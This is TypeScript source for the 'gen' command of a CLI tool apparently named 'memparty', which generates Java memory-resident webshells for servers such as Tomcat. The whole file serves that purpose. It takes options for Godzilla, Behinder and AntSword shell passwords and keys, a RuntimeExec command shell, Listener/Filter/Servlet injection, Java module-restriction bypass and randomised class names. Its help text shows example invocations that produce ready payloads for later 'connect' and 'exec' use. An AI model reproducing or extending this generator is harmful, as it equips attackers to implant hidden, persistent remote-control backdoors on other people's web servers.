import { readFileSync } from "node:fs";

import { Command, Option } from "commander";

import { createClient, type GlobalOptions, logInfo } from "../cli-context.js";
import { logOp } from "../core/oplog.js";
import { emitPayload } from "../core/output.js";
import { buildMemShellRequest, type MemShellOptions } from "../core/request-builder.js";
import { runMemShellWizard } from "../wizard/memshell-wizard.js";

interface GenCmdOptions extends GlobalOptions {
  server?: string;
  serverVersion?: string;
  tool?: string;
  type?: string;
  packer?: string;
  jdk?: string;
  debug?: boolean;
  bypassModule?: boolean;
  shrink?: boolean;
  lambdaSuffix?: boolean;
  probe?: boolean;
  shellClassName?: string;
  godzillaPass?: string;
  godzillaKey?: string;
  behinderPass?: string;
  antswordPass?: string;
  commandParamName?: string;
  commandTemplate?: string;
  encryptor?: string;
  implementationClass?: string;
  headerName?: string;
  headerValue?: string;
  shellClassBase64?: string;
  shellClassFile?: string;
  urlPattern?: string;
  injectorClassName?: string;
  staticInitialize?: boolean;
  output?: string;
  decode?: boolean;
  json?: boolean;
  interactive?: boolean;
}

const REQUIRED = ["server", "tool", "type", "packer"] as const;

function toOptions(o: GenCmdOptions): MemShellOptions {
  let shellClassBase64 = o.shellClassBase64;
  if (o.shellClassFile) {
    shellClassBase64 = readFileSync(o.shellClassFile).toString("base64");
  }
  return {
    server: o.server!,
    serverVersion: o.serverVersion,
    shellTool: o.tool!,
    shellType: o.type!,
    packer: o.packer!,
    jdk: o.jdk,
    debug: o.debug,
    byPassJavaModule: o.bypassModule,
    shrink: o.shrink,
    lambdaSuffix: o.lambdaSuffix,
    probe: o.probe,
    shellClassName: o.shellClassName,
    godzillaPass: o.godzillaPass,
    godzillaKey: o.godzillaKey,
    behinderPass: o.behinderPass,
    antSwordPass: o.antswordPass,
    commandParamName: o.commandParamName,
    commandTemplate: o.commandTemplate,
    encryptor: o.encryptor,
    implementationClass: o.implementationClass,
    headerName: o.headerName,
    headerValue: o.headerValue,
    shellClassBase64,
    urlPattern: o.urlPattern,
    injectorClassName: o.injectorClassName,
    staticInitialize: o.staticInitialize,
  };
}

export function registerGenCommand(program: Command): void {
  program
    .command("gen")
    .alias("generate")
    .description("Generate a memory shell. Runs an interactive wizard when required flags are missing.")
    .option("-s, --server <server>", "target server, e.g. Tomcat")
    .option("--server-version <v>", "target server version")
    .option("-t, --tool <tool>", "shell tool, e.g. Godzilla, Behinder, Command")
    .option("-y, --type <type>", "shell type, e.g. Listener, Filter, Servlet")
    .option("-p, --packer <packer>", "packer, e.g. Base64, Jar, JSP")
    .option("--jdk <version>", "target JDK: java6/8/9/11/17/21, or a class-file major version")
    .option("--debug", "enable debug output in the payload")
    .option("--bypass-module", "bypass Java module restrictions")
    .option("--no-shrink", "disable bytecode shrinking (enabled by default)")
    .option("--lambda-suffix", "append a lambda class-name suffix")
    .option("--probe", "use echo/probe mode")
    .option("--shell-class-name <name>", "explicit shell class name (random if omitted)")
    .option("--godzilla-pass <pass>", "Godzilla password")
    .option("--godzilla-key <key>", "Godzilla key")
    .option("--behinder-pass <pass>", "Behinder password")
    .option("--antsword-pass <pass>", "AntSword password")
    .option("--command-param-name <name>", "Command tool parameter name")
    .option("--command-template <tpl>", "Command template ({command} placeholder)")
    .option("--encryptor <name>", "Command encryptor")
    .option("--implementation-class <name>", "Command implementation class")
    .option("--header-name <name>", "auth header name")
    .option("--header-value <value>", "auth header value")
    .option("--shell-class-base64 <b64>", "custom shell class (base64) for the Custom tool")
    .option("--shell-class-file <path>", "custom shell .class file for the Custom tool")
    .option("--url-pattern <pattern>", "injector URL pattern")
    .option("--injector-class-name <name>", "explicit injector class name")
    .option("--no-static-initialize", "disable injector static initialization (enabled by default)")
    .option("-o, --output <file>", "write payload to a file instead of stdout")
    .addOption(new Option("--decode", "base64-decode the payload before writing"))
    .addOption(new Option("--no-decode", "do not base64-decode the payload"))
    .option("--json", "print the full JSON response instead of just the payload")
    .option("-i, --interactive", "force the interactive wizard")
    .option("--no-interactive", "never launch the wizard; error on missing flags")
    .addHelpText(
      "after",
      `
Examples:
  $ memparty gen                                  # interactive wizard
  $ memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \\
      --godzilla-pass pass --godzilla-key key --jdk java8
  $ memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \\
      --godzilla-pass pass --godzilla-key key -o shell.class
  $ memparty gen -s Tomcat -t Command -y Filter -p DefaultBase64 \\
      --command-param-name cmd --encryptor RAW --implementation-class RuntimeExec
  $ memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 --json

Note: run 'memparty config' to list the available servers, tools, shell
types and packers. Some packers (e.g. Base64) are aggregate packers that
return several variants at once — pick a leaf packer (e.g. DefaultBase64)
for a single payload. The --json output includes the gate header
(shellToolConfig) you need for 'memparty connect' / 'memparty exec'.
`,
    )
    .action(async (opts: GenCmdOptions, cmd: Command) => {
      const client = createClient(cmd.optsWithGlobals());

      const missing = REQUIRED.filter((k) => !opts[k]);
      const stdinIsTty = Boolean(process.stdin.isTTY);
      const wantWizard =
        opts.interactive === true ||
        (opts.interactive !== false && missing.length > 0 && stdinIsTty);

      let memOpts: MemShellOptions;
      if (wantWizard) {
        memOpts = await runMemShellWizard(client);
      } else {
        if (missing.length > 0) {
          throw new Error(
            `Missing required option(s): ${missing.map((m) => `--${m}`).join(", ")}. ` +
              `Run in a terminal for the wizard, or pass -i.`,
          );
        }
        memOpts = toOptions(opts);
      }

      const request = buildMemShellRequest(memOpts);
      // safe summary for the op log — parameters only, never credentials
      const genMeta = {
        server: memOpts.server,
        serverVersion: memOpts.serverVersion,
        shellTool: memOpts.shellTool,
        shellType: memOpts.shellType,
        packer: memOpts.packer,
        jdk: memOpts.jdk,
      };
      const started = Date.now();
      let response;
      try {
        response = await client.generateMemShell(request);
      } catch (err) {
        logOp({
          category: "gen",
          action: "gen",
          ok: false,
          durationMs: Date.now() - started,
          error: err instanceof Error ? err.message : String(err),
          meta: genMeta,
        });
        throw err;
      }
      logOp({
        category: "gen",
        action: "gen",
        ok: true,
        durationMs: Date.now() - started,
        detail: `${response.memShellResult.shellClassName} (${response.memShellResult.shellSize} bytes)`,
        meta: genMeta,
      });

      if (opts.json) {
        process.stdout.write(`${JSON.stringify(response, null, 2)}\n`);
        return;
      }

      const r = response.memShellResult;
      logInfo(`shell class:    ${r.shellClassName} (${r.shellSize} bytes)`);
      logInfo(`injector class: ${r.injectorClassName} (${r.injectorSize} bytes)`);

      if (response.allPackResults && Object.keys(response.allPackResults).length > 0) {
        for (const [name, value] of Object.entries(response.allPackResults)) {
          logInfo(`\n=== ${name} ===`);
          process.stdout.write(`${value}\n`);
        }
        return;
      }

      if (response.packResult === undefined) {
        throw new Error("Server returned no packResult.");
      }

      const result = emitPayload(response.packResult, {
        outFile: opts.output,
        decode: opts.decode,
      });
      if (result.destination !== "stdout") {
        logInfo(`wrote ${result.size} bytes to ${result.destination}${result.decoded ? " (base64-decoded)" : ""}`);
      }
    });
}
